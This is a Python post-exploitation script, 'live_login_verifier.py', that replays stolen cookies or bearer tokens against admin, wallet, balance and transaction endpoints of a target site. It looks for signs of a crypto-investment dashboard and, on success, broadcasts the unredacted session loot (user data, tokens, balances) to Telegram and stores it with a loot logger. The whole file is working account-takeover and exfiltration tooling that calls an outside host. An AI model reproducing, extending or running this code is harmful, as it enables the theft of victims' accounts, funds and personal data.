#!/usr/bin/env python3
"""
LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v8.0 (With Telegram Telemetry)
Senior Red Team Edition: Structural JSON schema validation, strict negative DOM assertions,
centralized framework loot exfiltration, and real-time Telegram broadcasting.
"""
import sys
import os
import time
import json
import httpx
import asyncio
from urllib.parse import urlsplit

# Import centralized framework loot logger, telemetry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous verifier functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
    parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    probe_endpoints = [
        endpoint,
        "/admin/dashboard",
        "/dashboard",
        "/user/dashboard",
        "/api/user/balance",
        "/user/wallet",
        "/wallet",
        "/api/user/wallet",
        "/api/user/transaction",
        "/user/transaction",
        "transaction",
        "/api/auth/user",
        "/api/dashboard/stats"
    ]
    
    seen = set()
    targets = [e for e in probe_endpoints if not (e in seen or seen.add(e))]

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    if token:
        headers["Authorization"] = f"Bearer {token}"

    cookies = cookie_dict or {}

    with httpx.Client(verify=False, follow_redirects=True, cookies=cookies, timeout=10.0) as client:
        for ep in targets:
            target_endpoint = f"{base_url}{ep}"
            log(f"\n[***] RED TEAM VERIFICATION: Probing {target_endpoint} [***]", "\033[95m")

            try:
                response = client.get(target_endpoint, headers=headers)
                status = response.status_code
                body = response.text.strip()
                content_type = response.headers.get("content-type", "").lower()

                # Rule 1: Check for JSON API Authentication Response (Hard Proof)
                if "application/json" in content_type or body.startswith("{") or body.startswith("["):
                    try:
                        data = json.loads(body)
                        has_user_keys = any(k in data for k in ["user", "token", "access_token", "balance", "wallet", "email"])
                        is_error_payload = data.get("status") == "error" or "message" in data and "unauthorized" in str(data["message"]).lower()
                        
                        if status in [200, 201] and has_user_keys and not is_error_payload:
                            log(f"[!!!] SUCCESS! Verified API Session Loot at {ep} [HTTP {status}] [!!!]", "\033[91m")
                            
                            loot_payload = {
                                "endpoint": target_endpoint,
                                "status": status,
                                "verified_data": data
                            }

                            # BROADCAST UNREDACTED SESSION LOOT STRAIGHT TO TELEGRAM
                            broadcast_tg_alert_sync("Live Login Verified API Session Loot", loot_payload)

                            # Stream telemetry and persist through centralized loot logger
                            stream_proof("LIVE_LOGIN_VERIFIED_API", ep, {"cookie_jar": cookies}, body, data)
                            save_session_loot(
                                target=base_url,
                                endpoint=ep,
                                finding_type="LIVE_LOGIN_VERIFIED_API",
                                status=status,
                                headers=dict(response.headers),
                                body=body,
                                extra_loot=loot_payload
                            )
                            return True
                    except json.JSONDecodeError:
                        pass

                # Rule 2: HTML Response Deep Inspection (Defending against login wrappers)
                is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or len(body) < 150
                has_password_field = 'type="password"' in body.lower() or "input name=\"password\"" in body.lower()
                has_login_terms = any(term in body.lower() for term in ["admin login", "sign in to your account", "login-form", "csrf-token"])
                
                if has_password_field or has_login_terms:
                    log(f"[-] Endpoint {ep} served a login/authentication gate. False positive avoided.", "\033[93m")
                    continue

                # Rule 3: Positive validation for actual dashboard content
                has_real_dashboard_markers = any(term in body.lower() for term in [
                    "total deposit", "wallet balance", "active investment", "crypto balance", "withdrawal history"
                ])

                if status == 200 and not is_spa_shell and has_real_dashboard_markers:
                    log(f"[!!!] SUCCESS! Verified HTML Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
                    
                    loot_payload = {
                        "endpoint": target_endpoint,
                        "status": status,
                        "response_excerpt": body[:300]
                    }

                    # BROADCAST UNREDACTED DASHBOARD LOOT STRAIGHT TO TELEGRAM
                    broadcast_tg_alert_sync("Live Login Verified HTML Dashboard Access", loot_payload)

                    # Stream telemetry and persist through centralized loot logger
                    stream_proof("LIVE_LOGIN_VERIFIED_HTML", ep, {"cookie_jar": cookies}, body[:300], {"status": status})
                    save_session_loot(
                        target=base_url,
                        endpoint=ep,
                        finding_type="LIVE_LOGIN_VERIFIED_HTML",
                        status=status,
                        headers=dict(response.headers),
                        body=body,
                        extra_loot=loot_payload
                    )
                    return True
                else:
                    log(f"[-] Endpoint {ep} returned generic state or unauthenticated view (Status {status}).", "\033[93m")

            except Exception as exc:
                log(f"[-] Connection error on {ep}: {exc}", "\033[91m")

    log("[-] Verification sweep complete. No active session loot confirmed on tested routes.", "\033[91m")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 live_login_verifier.py <target_url> [endpoint]")
        sys.exit(1)
    
    target = sys.argv[1]
    ep = sys.argv[2] if len(sys.argv) > 2 else "/admin"

    execute_live_login_verification(target, ep)
